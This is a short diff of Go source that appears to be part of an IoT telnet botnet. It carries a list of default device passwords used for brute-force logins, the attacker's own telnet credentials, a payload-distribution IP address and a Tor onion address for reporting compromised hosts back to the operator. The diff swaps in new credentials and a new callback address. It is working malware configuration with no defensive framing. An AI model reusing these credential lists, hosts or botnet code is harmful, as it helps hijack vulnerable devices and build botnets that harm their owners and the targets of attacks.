@@ -60,11 +60,11 @@ var telnetPasswords = [110]string{"zlxx.", "zlxx", "wyse", "vizxv", "vagrant", "
 								   "2011vsta", "antslq", "20080826", "taZz@23495859", "hichiphx", "hdipc%No", "apix", "vhd1206", "059AnkJ", "xmhdipc",
 }
 
-var tnUser string = "chatounet"
-var tnPass string = "donotforgetthispassword"
+var tnUser string = "root"
+var tnPass string = "random"
 
 var Distrubuter string = "89.248.174.219"
-var reportBack string = "qpc4imqvwdsne36xgnt4bhj545m7f6fy4g3mqh56f5sw4vvvyql34vqd.onion"
+var reportBack string = "jmkc2dlkd2l45h37.onion"
 var telnetPort string = "23"
 
 const (
